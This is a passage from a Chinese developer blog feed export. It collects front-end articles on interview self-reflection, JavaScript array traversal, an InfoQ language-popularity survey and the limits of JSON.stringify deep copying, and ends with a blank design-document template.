<p><strong>面试中的总结</strong></p>
<p>多做几次总结会让自己更认识自己。虽然你有面试的机会，但这并不代表你能通过面试，那么每一次的面试失败就是你下一次面试成功的铺垫。我建议每次面试完之后去做一些总结，特别对于刚刚毕业的学生。通过总结你会清楚的知道：</p>
<ul>
<li>  <strong>技术：</strong>技术方面缺少什么？面试官看重的是什么？</li>
<li>  <strong>软实力：</strong>自己拿分项是哪些？自己丢分项是哪些？自己面试过程的沟通能力如何？</li>
<li>  <strong>失败原因：</strong>面试失败原因是什么？是由于技术不足？还是其他原因造成自己面试失败？</li>
<li>  还可以去思考更多的为什么？…</li>
</ul>
<p><strong>校招面试的现象</strong></p>
<p>这次面试主要针对的是校招生和实习生，总觉得他们都有一个普遍的现象。这些现像和@kejun在2011年写的博文**<a href="http://hikejun.com/blog/2011/10/26/%E8%BF%91%E6%9C%9F%E9%9D%A2%E8%AF%95%E6%84%9F%E5%8F%97/">《近期面试感受》</a>**非常的类似。</p>
<blockquote>
<p>以下部分内容引用@kejun的博文<a href="http://hikejun.com/blog/2011/10/26/%E8%BF%91%E6%9C%9F%E9%9D%A2%E8%AF%95%E6%84%9F%E5%8F%97/">《近期面试感受》</a></p>
</blockquote>
<p><strong>用的不是技术，更多是技巧</strong></p>
<p>由于学校里没有系统的前端开发课程，导致对HTML/CSS/JavaScript基本概念的理解非常薄弱。大部分人的学习方式是：先看书，然后觉得书和实践离得很远就直接实践，遇到问题就去网上搜、QQ群问，而这些方式得来的都仅是“技巧”性的东西。或者是跟着学校里的“牛人”学，掺着各种好的、坏的经验全盘接受。</p>
<p><strong>“搜索”式学习害人不浅</strong></p>
<p>面试中有同学觉得书上写的东西不实用，更喜欢边实践边学。但往往实践中主要解决具体问题，从网上搜到一个不好的例子，自己又不足以区分好坏。然后，就把它当成一个解决问题的模式，如果没人纠正，可能几年下来都这么用。网上的资源非常丰富，要区分“技术”和“技巧”。还是那句话，对技术人员来说技巧性的东西不应该太重。</p>
<p><strong>热衷新技术</strong></p>
<p>古人讲究温故而知新还是很有道理的。学习新技术可以给自我镀金，欠缺基础的东西就会内力不足，这样在应用的过程中就会有问题。</p>
<p><strong>学到“二手货”</strong></p>
<p>国内前端技术社区的分享质量总体还是不高。那些照搬国外，加上自己片面认识的资源就是“二手货”。这些资源在看的时候要慧眼识珠啊。最好还是直接看第一手资料。</p>
<p><strong>光看不用，坐等机会</strong></p>
<p>很多同学表示正在看什么什么，或正准备学什么什么。但就是没动手写过，总是希望在实习公司有实践机会。这样的机会可能永远也没有呢，完善自我的技能，是需要自己给自己创造机会，写一些demo，搞一些个人项目，参加一些技术交流，持续关注该技术的发展……坐等只能浪费时间。</p>
<p><strong>不注重基础</strong></p>
<p>正如前面所说，学校没有系统的前端课程，同学获取的知识点都是看书和网上获取，而且这些知识点又是零散型的。造成对很多问题只知其一不知其二。更为可怕的是，很多同学太过自信，觉得HTML/CSS都太简单了，只是JavaScript稍微难一点，这也造成自己对知识的认知度不足。另外还有一些同学太过急于求成，认为看了几个HTML标签和CSS属性自己就懂了。事实是你离其还甚远。</p>
<p><strong>目标过大</strong></p>
<p>毕业后选择BAT这样的大公司实习或就业，对于很多同学来说都是梦寐以求的。然而能进入这些公司的人却少之又少。很多人都在问”<strong><a href="http://www.zhihu.com/question/26188893">国内大型互联网公司（如BAT）对于web前端开发方向校招都考些什么？</a></strong>“,但这也仅停留在技术上的面试，却从未思考，BAT这些大公司需要的是技术型人才，而不是技巧型人才。那么你是属于技术型还是技巧型呢？</p>
<p>话又说回来，有目标是好事，能让自己有一个清晰的方向，但过于盲目却会让自己失去自信，失去未来，这样是得不尝失。与其如此，还不如思考一下，自己更适合什么样的环境去实习或工作。这跟追妹子是类似的“可遇不可求”。</p>
<p><strong>总结</strong></p>
<p>这事一篇与技术没有任何关系的文章，这也不是一篇心灵鸡汤，更像是泼冷水。而这些观点仅是我自己的建解，如果说得不对，您可以忽略，更希望你能指正。同时更希望的是，这篇文章对于正在面试或即将面试前端工作的同学有所帮助或有所感悟。</p>
<blockquote>
<p>作者：大漠<br>文章源自：<a href="http://www.w3cplus.com/css/write-to-front-end-developer-interview.html">http://www.w3cplus.com/css/write-to-front-end-developer-interview.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>数组遍历与属性</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E6%95%B0%E7%BB%84%E9%81%8D%E5%8E%86%E4%B8%8E%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<p>虽然在 JavaScript 中数组是对象，但是没有好的理由去使用 <code>for in</code> 循环遍历数组。 相反，有一些好的理由<strong>不去</strong>使用 <code>for in</code> 遍历数组。</p>
<p><strong>注意:</strong> JavaScript 中数组<strong>不是</strong> <em>关联数组</em>。 JavaScript 中只有<code>对象</code>来管理键值的对应关系。但是关联数组是<strong>保持</strong>顺序的，而对象<strong>不是</strong>。</p>
<p>由于 <code>for in</code> 循环会枚举原型链上的所有属性，唯一过滤这些属性的方式是使用 <a href="http://bonsaiden.github.io/JavaScript-Garden/zh/#object.hasownproperty"><code>hasOwnProperty</code></a> 函数， 因此会比普通的 <code>for</code> 循环慢上好多倍。</p>
<blockquote>
<p><strong>注意:</strong> JavaScript 中数组<strong>不是</strong> <em>关联数组</em>。 JavaScript 中只有<code>对象</code>来管理键值的对应关系。但是关联数组是<strong>保持</strong>顺序的，而对象<strong>不是</strong>。</p>
</blockquote>
<h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p>为了达到遍历数组的最佳性能，推荐使用经典的 <code>for</code> 循环。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var list &#x3D; [1, 2, 3, 4, 5, ...... 100000000];</span><br><span class="line">for(var i &#x3D; 0, l &#x3D; list.length; i &lt; l; i++) &#123;</span><br><span class="line">    console.log(list[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码有一个处理，就是通过 <code>l = list.length</code> 来缓存数组的长度。</p>
<p>虽然 <code>length</code> 是数组的一个属性，但是在每次循环中访问它还是有性能开销。 <strong>可能</strong>最新的 JavaScript 引擎在这点上做了优化，但是我们没法保证自己的代码是否运行在这些最近的引擎之上。</p>
<p>实际上，不使用缓存数组长度的方式比缓存版本要慢很多。</p>
<h3 id="length-属性"><a href="#length-属性" class="headerlink" title="length 属性"></a><code>length</code> 属性</h3><p><code>length</code> 属性的 <em>getter</em> 方式会简单的返回数组的长度，而 <em>setter</em> 方式会<strong>截断</strong>数组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var foo &#x3D; [1, 2, 3, 4, 5, 6];</span><br><span class="line">foo.length &#x3D; 3;</span><br><span class="line">foo; &#x2F;&#x2F; [1, 2, 3]</span><br><span class="line"></span><br><span class="line">foo.length &#x3D; 6;</span><br><span class="line">foo; &#x2F;&#x2F; [1, 2, 3]</span><br></pre></td></tr></table></figure>

<p> 在 Firebug 中查看此时 <code>foo</code> 的值是： <code>[1, 2, 3, undefined, undefined, undefined]</code> 但是这个结果并不准确，如果你在 Chrome 的控制台查看 <code>foo</code> 的结果，你会发现是这样的： <code>[1, 2, 3]</code> 因为在 JavaScript 中 <code>undefined</code> 是一个变量，注意是变量不是关键字，因此上面两个结果的意义是完全不相同的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 为了验证，我们来执行下面代码，看序号 5 是否存在于 foo 中。</span><br><span class="line">5 in foo; &#x2F;&#x2F; 不管在 Firebug 或者 Chrome 都返回 false</span><br><span class="line">foo[5] &#x3D; undefined;</span><br><span class="line">5 in foo; &#x2F;&#x2F; 不管在 Firebug 或者 Chrome 都返回 true</span><br></pre></td></tr></table></figure>

<p>为 <code>length</code> 设置一个更小的值会截断数组，但是增大 <code>length</code> 属性值不会对数组产生影响。</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>为了更好的性能，推荐使用普通的 <code>for</code> 循环并缓存数组的 <code>length</code> 属性。 使用 <code>for in</code> 遍历数组被认为是不好的代码习惯并倾向于产生错误和导致性能问题。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>大前端领域，什么样的人最吃香？｜InfoQ 编程语言 4 月排行榜</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%A4%A7%E5%89%8D%E7%AB%AF%E9%A2%86%E5%9F%9F%EF%BC%8C%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E4%BA%BA%E6%9C%80%E5%90%83%E9%A6%99%EF%BC%9F/</url>
    <content><![CDATA[<p>提起大前端，总会有人抱怨“学不动了”，因为技术更新太快。那大前端的风会吹向何方？是跨端、Flutter、Serverless，还是小程序？为回答上述问题，结合 InfoQ 编程语言 4 月排行榜的调查结果，我们采访了大前端领域的三名程序员，试图了解这个领域的程序员们。</p>
<h5 id="发现-1：Web-开发依然是大前端领域的主流"><a href="#发现-1：Web-开发依然是大前端领域的主流" class="headerlink" title="发现 1：Web 开发依然是大前端领域的主流"></a>发现 1：Web 开发依然是大前端领域的主流</h5><p><img src="https://upload-images.jianshu.io/upload_images/10024246-7433f22baa7e4ec4?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>基于投票数据，我们发现 Web 开发得票率为 68%，由此可见它依然是大前端领域的主流。iOS 开发得票率为 16%，排名第二，而 Android 开发则以 5% 的得票率排名第四。同时，我们注意到，小程序开发以 6% 的得票率超过 Android 开发的 5%。</p>
<p>在采访中，网名叫月熊的程序员表示，自己在大前端领域最关心的技术方向是跨端开发、微前端和数据可视化 / 交互。而他所在公司的业务是面向小批量制造领域的数字化工厂和智能制造行业，主要工作涉及基于 Web 的跨端应用开发，包括 Web 端、移动端、桌面端、小程序端，以及部分 3D 数据展示和模型处理。</p>
<p>而在某银行信息科技部基础技术板块担任前端负责人的英楠同样也在关注跨端框架，他说：“最想学习和实战 Flutter。“</p>
<h5 id="发现-2：JavaScript-在大前端领域“独霸天下”"><a href="#发现-2：JavaScript-在大前端领域“独霸天下”" class="headerlink" title="发现 2：JavaScript 在大前端领域“独霸天下”"></a>发现 2：JavaScript 在大前端领域“独霸天下”</h5><p><img src="https://upload-images.jianshu.io/upload_images/10024246-1d0bc3a412be6e10?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>基于投票数据，我们发现在大前端领域编程语言使用情况上，JavaScript 以 78.5% 的得票率，排名第一。而 TypeScript 得票率为 42.9%，排名第二。</p>
<p>考虑到这两门编程语言都属于 JavaScript 生态，JavaScript 在大前端堪称“独霸天下”。前端程序员英楠在采访中称，使用最多的编程语言还是 JavaScript，因为工作主要还是面向 B 端，几乎全部项目都是用 JavaScript，公共组件则是用 TypeScript 开发。</p>
<p>另一位前端程序员月熊则表示，自己在工作中使用最多的编程语言是 TypeScript，“相比 JavaScript，它有静态语法特性，更符合大规模、跨端协作项目的开发”。</p>
<p>前端程序员小吴说：“使用最多的编程语言是 JavaScript。自从有了 node.js 后，JavaScript 几乎可以处理任何业务逻辑，包含后端的数据增删查改、前端页面渲染和用户交互操作等。阿特伍德定律说，任何可以用 JavaScript 来写的应用，最终都将用 JavaScript 来写。”</p>
<h5 id="发现-3：选择编程语言最看重的是语言生态"><a href="#发现-3：选择编程语言最看重的是语言生态" class="headerlink" title="发现 3：选择编程语言最看重的是语言生态"></a>发现 3：选择编程语言最看重的是语言生态</h5><p><img src="https://upload-images.jianshu.io/upload_images/10024246-cf88ef49d29728ed?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>在选择编程语言时，最看重的因素是什么？答案是语言生态。语言生态得票率为 63.4%，排名第一。对前端开发者来说，语言生态是最看重的，它包括工具链的完备程度，库、框架等完善程度。生产效率得票率为 22.2%，排名第二，而语言的功能特性则排名第三。</p>
<p>发现 4：Vue 和 React 是最流行的前端开发框架</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8b837ea731ef04b9?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>基于投票数据，我们发现 Vue.js 以 46.5% 的得票率排名第一，被视为最流行的前端开发框架。而 React 紧随其后，以 31.5% 的得票率排名第二。Flutter 排名第三，得票率为 8.5%。</p>
<p>月熊在采访中表示，最常用的前端开发框架是 React，其生态圈较为完善，“编程习惯上更易于贴合工程化的需求”。</p>
<p>英楠同样是 React 的忠实用户，他说：“最常用的是 React。React 生态非常完善，满足了我们项目的一切需求，市面上能与抗衡的就只有 Vue 了。”</p>
<p>对前端程序员来说，编程语言或框架对他们的工作非常重要。月熊认为，不同编程语言或框架几乎决定了不同的生态圈，这会极大地影响到项目组织、团队组织以及第三方库的使用。他自述，他们团队早年间选用过 Angular 1，但后面在性能和升级上都碰到较大的困难。</p>
<p>英楠称，在 React 这类数据驱动试图的前端框架前，一个项目使用的是 JSP 渲染前端页面，前后端完全耦合，连开发一个简单的需求都非常痛苦，”后来，2018 年使用 Vue 将老项目进行了渐进式迁移，开发效率提升至少 5 倍“。</p>
<p>小吴说：“React 和 Vue 各占一半。比较严谨的业务逻辑，使用 React 和 TypeScript。要快速开发的小项目则使用 Vue 2。此前还重度使用过 Angular.js。”</p>
<h5 id="大前端的未来与前端程序员的核心能力"><a href="#大前端的未来与前端程序员的核心能力" class="headerlink" title="大前端的未来与前端程序员的核心能力"></a>大前端的未来与前端程序员的核心能力</h5><p>由国内业界发明的技术名词“大前端”如今逐渐成为前端领域的大趋势。而前端未来会如何发展？在月熊看来，随着前端项目的不断增大，前端在未来应具备更强大的运行能力，可以提供更复杂的交互，也期待 VR/AR 时代的到来。英楠则表示，近些年，前端井喷式增长得到缓和，但人才缺口仍然巨大，希望在 AI+ 前端领域有更多突破，解决绝大多数的重复劳动，解放前端人员的生产力。</p>
<p>当然，大前端的变化反过来也会影响前端程序员。现在的大前端有点“全栈”的味道，并且以前的胶水代码越来越行不通，前端程序员也会强化自己的工程思维，具备体系化知识，并且能熟练使用各种框架。</p>
<p>英楠表示，未来最看重的前端程序员核心能力就是工程师能力。“我认为前端程序员未来的核心能力，除了前端专业技能外，工程化思维、分析问题和解决问题的能力以及学习能力都非常关键。“他说。</p>
<p>而月熊认为，前端程序员未来要具备的核心能力分三部分：</p>
<ul>
<li>第一，编程基本素养，包括但不限于编程范式、设计模式、数据结构与算法等；</li>
<li>第二，工程化能力，能从编写简单的页面到 Hold 住大型项目；</li>
<li>第三，产品 / 交互的感知能力，能理解产品设计，能自觉践行某些交互优化的原则 / 范式，为用户提供更好的交互体验。<blockquote>
<p>原文：<a href="https://mp.weixin.qq.com/s?__biz=MzUxMzcxMzE5Ng==&amp;mid=2247509000&amp;idx=1&amp;sn=6058104917c06b0c4fa47fa54ceb549a&amp;chksm=f952114bce25985d2ff774bac1e952f56dca4b149bdc811505983cb0a1460615e9100ef50520&amp;scene=27#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzUxMzcxMzE5Ng==&amp;mid=2247509000&amp;idx=1&amp;sn=6058104917c06b0c4fa47fa54ceb549a&amp;chksm=f952114bce25985d2ff774bac1e952f56dca4b149bdc811505983cb0a1460615e9100ef50520&amp;scene=27#wechat_redirect</a></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>利用 JSON.stringify 深拷贝的弊端</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%88%A9%E7%94%A8%20JSON.stringify%20%E6%B7%B1%E6%8B%B7%E8%B4%9D%E7%9A%84%E5%BC%8A%E7%AB%AF/</url>
    <content><![CDATA[<p>深拷贝不仅将原对象的各个属性逐个复制出去，而且将原对象各个属性所包含的对象也依次采用深拷贝的方法递归复制到新对象上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function deepClone(obj)&#123;</span><br><span class="line">    let obj_ &#x3D; JSON.stringify(obj),</span><br><span class="line">    loneObj &#x3D; JSON.parse(obj_);</span><br><span class="line">    return loneObj</span><br><span class="line">&#125;</span><br><span class="line">let a&#x3D;[1,2,3,4,[2,3,4]],</span><br><span class="line">b &#x3D; deepClone(a);</span><br><span class="line">console.log(a,b);</span><br></pre></td></tr></table></figure>
<p>结果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-e4e276aba8a446aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="弊端："><a href="#弊端：" class="headerlink" title="弊端："></a>弊端：</h2><h5 id="1-如果-obj-里面有时间对象，则-JSON-stringify-后再-JSON-parse-的结果，时间将转为字符串的形式，而不是对象的形式"><a href="#1-如果-obj-里面有时间对象，则-JSON-stringify-后再-JSON-parse-的结果，时间将转为字符串的形式，而不是对象的形式" class="headerlink" title="1.如果 obj 里面有时间对象，则 JSON.stringify 后再 JSON.parse 的结果，时间将转为字符串的形式，而不是对象的形式"></a>1.如果 obj 里面有时间对象，则 JSON.stringify 后再 JSON.parse 的结果，时间将转为字符串的形式，而不是对象的形式</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let obj &#x3D; &#123;</span><br><span class="line">    a:123,</span><br><span class="line">    b:[new Date(),new Date()]</span><br><span class="line">&#125;</span><br><span class="line">let newObj &#x3D; JSON.parse(JSON.stringify(obj));</span><br><span class="line">console.log(obj,newObj);</span><br></pre></td></tr></table></figure>
<p>例如：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-f7c03875bd5412ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h5 id="2-如果-obj-里有-RegExp-正则表达式的缩写-、Error-对象，则序列化的结果将只得到空对象；"><a href="#2-如果-obj-里有-RegExp-正则表达式的缩写-、Error-对象，则序列化的结果将只得到空对象；" class="headerlink" title="2.如果 obj 里有 RegExp (正则表达式的缩写)、Error 对象，则序列化的结果将只得到空对象；"></a>2.如果 obj 里有 RegExp (正则表达式的缩写)、Error 对象，则序列化的结果将只得到空对象；</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let obj &#x3D; &#123;</span><br><span class="line">    a:123,</span><br><span class="line">    b:&#x2F;aabb[a-z]\d&#x2F;,</span><br><span class="line">    c:new TypeError(&#39;typeError&#39;)</span><br><span class="line">&#125;</span><br><span class="line">let newObj &#x3D; JSON.parse(JSON.stringify(obj));</span><br><span class="line">console.log(obj,newObj);</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-0e273cafa2f303ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/10024246-814ec09b0a942374.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h5 id="3、如果-obj-里有函数（function），undefined，Symbol-则序列化的结果会把-function-或-undefined-丢失；"><a href="#3、如果-obj-里有函数（function），undefined，Symbol-则序列化的结果会把-function-或-undefined-丢失；" class="headerlink" title="3、如果 obj 里有函数（function），undefined，Symbol 则序列化的结果会把 function 或 undefined 丢失；"></a>3、如果 obj 里有函数（function），undefined，Symbol 则序列化的结果会把 function 或 undefined 丢失；</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let obj &#x3D; &#123;</span><br><span class="line">    a:123,</span><br><span class="line">    fn:function()&#123;let a &#x3D; 123;console.log(a)&#125;,</span><br><span class="line">    c:undefined,</span><br><span class="line">    d:Symbol(&#39;foo&#39;)</span><br><span class="line">&#125;</span><br><span class="line">let newObj &#x3D; JSON.parse(JSON.stringify(obj));</span><br><span class="line">console.log(obj,newObj);</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-25b032809dfcf831.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h5 id="4、如果obj里有-NaN、Infinity-和-Infinity，则序列化的结果会变成-null"><a href="#4、如果obj里有-NaN、Infinity-和-Infinity，则序列化的结果会变成-null" class="headerlink" title="4、如果obj里有 NaN、Infinity 和 -Infinity，则序列化的结果会变成 null"></a>4、如果obj里有 NaN、Infinity 和 -Infinity，则序列化的结果会变成 null</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let obj &#x3D; &#123;</span><br><span class="line">    a:123,</span><br><span class="line">    b:NaN,</span><br><span class="line">    c:Infinity,</span><br><span class="line">    d:-Infinity</span><br><span class="line">&#125;</span><br><span class="line">let newObj &#x3D; JSON.parse(JSON.stringify(obj));</span><br><span class="line">console.log(obj,newObj);</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7b63f03dccb24601.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h5 id="5、JSON-stringify-只能序列化对象的可枚举的自有属性，例如如果-obj-中的对象是有构造函数生成的，-则使用-JSON-parse-JSON-stringify-obj-深拷贝后，会丢弃对象的-constructor；"><a href="#5、JSON-stringify-只能序列化对象的可枚举的自有属性，例如如果-obj-中的对象是有构造函数生成的，-则使用-JSON-parse-JSON-stringify-obj-深拷贝后，会丢弃对象的-constructor；" class="headerlink" title="5、JSON.stringify() 只能序列化对象的可枚举的自有属性，例如如果 obj 中的对象是有构造函数生成的， 则使用 JSON.parse(JSON.stringify(obj)) 深拷贝后，会丢弃对象的 constructor；"></a>5、JSON.stringify() 只能序列化对象的可枚举的自有属性，例如如果 obj 中的对象是有构造函数生成的， 则使用 JSON.parse(JSON.stringify(obj)) 深拷贝后，会丢弃对象的 constructor；</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Student&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.a &#x3D; 1;</span><br><span class="line">        this.b &#x3D; 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let obj &#x3D; &#123;</span><br><span class="line">    a:123,</span><br><span class="line">    b:new Student()</span><br><span class="line">&#125;</span><br><span class="line">let newObj &#x3D; JSON.parse(JSON.stringify(obj));</span><br><span class="line">console.log(obj,newObj);</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-71619104d9168a18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>手动设置某属性不可枚举：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let obj &#x3D; &#123;</span><br><span class="line">    a:123,</span><br><span class="line">    b:234</span><br><span class="line">&#125;</span><br><span class="line">Object.defineProperty(obj,&#39;c&#39;,&#123;</span><br><span class="line">    value:22,</span><br><span class="line">    enumerable:false,</span><br><span class="line">&#125;)</span><br><span class="line">let newObj &#x3D; JSON.parse(JSON.stringify(obj));</span><br><span class="line">console.log(obj,newObj);</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-739d98fb75d5d364.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h5 id="6、如果对象中存在循环引用的情况也无法正确实现深拷贝；"><a href="#6、如果对象中存在循环引用的情况也无法正确实现深拷贝；" class="headerlink" title="6、如果对象中存在循环引用的情况也无法正确实现深拷贝；"></a>6、如果对象中存在循环引用的情况也无法正确实现深拷贝；</h5><p>总结：</p>
<ul>
<li>Date 对象变为字符串</li>
<li>RegExp、Error 对象变为空对象 {}</li>
<li>函数、undefined、Symbol 属性丢失</li>
<li>NaN、Infinity、-Infinity 变为 null</li>
<li>enumerable 为 false 的属性丢失</li>
<li>循环引用的对象不能正确拷贝<br>用法简单，然而使用这种方法会有一些隐藏的坑：因为在序列化 JavaScript 对象时，所有函数和原型成员会被有意忽略。</li>
</ul>
<p>通俗点说，JSON.parse(JSON.stringfy(X))，其中 X 只能是 Number, String, Boolean, Array,扁平对象，即那些能够被 JSON 直接表示的数据结构。</p>
<h2 id="JSON-stringify-常用方式"><a href="#JSON-stringify-常用方式" class="headerlink" title="JSON.stringify() 常用方式"></a>JSON.stringify() 常用方式</h2><p>1.判断数组是否包含某对象，或者判断对象是否相等<br>是否相等：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let obj &#x3D; &#123;</span><br><span class="line">    a:123,</span><br><span class="line">    b:456,</span><br><span class="line">&#125;</span><br><span class="line">let obj2 &#x3D; &#123;</span><br><span class="line">    a:123,</span><br><span class="line">    b:456,</span><br><span class="line">&#125;</span><br><span class="line">console.log(JSON.stringify(obj) &#x3D;&#x3D;&#x3D; JSON.stringify(obj2));&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
<p>2.是否包含：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let arr &#x3D; [</span><br><span class="line">    &#123;a:1,b:2&#125;,</span><br><span class="line">    &#123;a:2,b:3&#125;,</span><br><span class="line">    &#123;a:3,b:4&#125;</span><br><span class="line">]</span><br><span class="line">let obj &#x3D; &#123;a:2,b:3&#125;</span><br><span class="line">console.log(JSON.stringify(arr).includes(JSON.stringify(obj)));&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
<p>3.让 localStorage / sessionStorage 可以存储对象。<br>localStorage/sessionStorage 默认只能存储字符串，而实际开发中，我们往往需要存储的数据多为对象类型，那么这里我们就可以在存储时利用 Json.stringify() 将对象转为字符串,取出时利用 JSON.parse() 将字符串转为对象即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sessionStorage.setItem(&#39;user&#39;,JSON.stringify(&#123;name:&#39;aaa&#39;,age:16&#125;));</span><br><span class="line">console.log(JSON.parse(sessionStorage.getItem(&#39;user&#39;)));&#x2F;&#x2F;&#123;name: &quot;aaa&quot;, age: 16&#125;</span><br></pre></td></tr></table></figure>
<p>4.JSON.stringify()与toString()这两者虽然都可以将目标值转为字符串，但本质上还是有区别的</p>
<p>```<br>let arr = [12,12,12];<br>console.log(JSON.stringify(arr),arr.toString());<br>//[12,12,12] 12,12,12<br> ````</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>概要设计 - 模版</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E6%A6%82%E8%A6%81%E8%AE%BE%E8%AE%A1%E6%A8%A1%E7%89%88/</url>
    <content><![CDATA[<h1 id="概要设计"><a href="#概要设计" class="headerlink" title="概要设计 -"></a>概要设计 -</h1><p>系统名称：*****<br>文档修订历史<br>|版本号 | 作者 |备注    |修订日期|<br> |  —-  | —-  |  —-  | —-  |<br>|v1.0|****|创建模版    |2020-7-29|</p>
<p> </p>
<h2 id="1-需求背景"><a href="#1-需求背景" class="headerlink" title="1. 需求背景"></a>1. 需求背景</h2><p>【【描述需求背景或者开发重构的目的/出发点】<br>原先大家写文档都是本机写文档，然后评审时统一交给主持人进行投影，文档版本管理也比较混乱</p>
<h2 id="2-需求分析"><a href="#2-需求分析" class="headerlink" title="2. 需求分析"></a>2. 需求分析</h2><h5 id="2-1-产品需求分析【产品需求适用】"><a href="#2-1-产品需求分析【产品需求适用】" class="headerlink" title="2.1. 产品需求分析【产品需求适用】"></a>2.1. 产品需求分析【产品需求适用】</h5><p>【用于描述对产品提出的需求的理解和分析：产品定位、新增功能、业务目标等，避免对需求的理解和产品不一致，导致做无用功】<br>XXXX。。。</p>
<h5 id="2-2-技术技术需求分析【技术优化适用】"><a href="#2-2-技术技术需求分析【技术优化适用】" class="headerlink" title="2.2. 技术技术需求分析【技术优化适用】"></a>2.2. 技术技术需求分析【技术优化适用】</h5><p>【用于描述对技术团队提出的技术需求的理解和分析：技术债务清理、市场反馈问题改善、性能体验优化、技术指标达成、技术方案更新等。此处应包含技术改善项目和大致的实现策略】<br>XXXX。。。</p>
<h2 id="3-整体实现方案"><a href="#3-整体实现方案" class="headerlink" title="3. 整体实现方案"></a>3. 整体实现方案</h2><h5 id="3-1-整体框架图"><a href="#3-1-整体框架图" class="headerlink" title="3.1. 整体框架图"></a>3.1. 整体框架图</h5><p>【展示应用整体的框架图，包括整体结构、应用分层、模块解耦】<br>XXXX。。。
 </p>
<h5 id="3-2-核心功能流程图"><a href="#3-2-核心功能流程图" class="headerlink" title="3.2. 核心功能流程图"></a>3.2. 核心功能流程图</h5><p>【展示新增核心功能的流程图，帮助梳理整个功能的逻辑，减少编码过程中由于前期考虑不周导致的不稳定性和随机bug】<br>XXXX。。。
 </p>
<h2 id="4-模块设计"><a href="#4-模块设计" class="headerlink" title="4. 模块设计"></a>4. 模块设计</h2><p>【根据原型或者UX稿识别需要新增或修改的页面、模块、组件，尽量解耦】<br>XXXX。。。
 </p>
<h2 id="5-接口设计"><a href="#5-接口设计" class="headerlink" title="5. 接口设计"></a>5. 接口设计</h2><p>【列出所有关联接口及功能描述，详细参数交互后续补充，标注新增或修改】<br>XXXX。。。</p>
<h2 id="6-异常流程设计"><a href="#6-异常流程设计" class="headerlink" title="6.异常流程设计"></a>6.异常流程设计</h2><p>【列出所有交互异常流程处理方案，接口异常处理方案】</p>
<h2 id="7-风险及应对方案"><a href="#7-风险及应对方案" class="headerlink" title="7. 风险及应对方案"></a>7. 风险及应对方案</h2><p>【列出开发相关的风险项：资损风险、安全风险、指标达成风险、进度风险等，以及针对各项风险的应对方案。如设计中包含，需详细说明；如不包含，请写明【确认无此风险】</p>
<h5 id="7-1-资损风险分析"><a href="#7-1-资损风险分析" class="headerlink" title="7.1. 资损风险分析"></a>7.1. 资损风险分析</h5><p>XXXX。。。
 </p>
<h5 id="7-2-安全风险分析"><a href="#7-2-安全风险分析" class="headerlink" title="7.2. 安全风险分析"></a>7.2. 安全风险分析</h5><p>XXXX。。。
 </p>
<h5 id="7-3-接口改动是否兼容老版本"><a href="#7-3-接口改动是否兼容老版本" class="headerlink" title="7.3. 接口改动是否兼容老版本"></a>7.3. 接口改动是否兼容老版本</h5><p>XXXX。。。
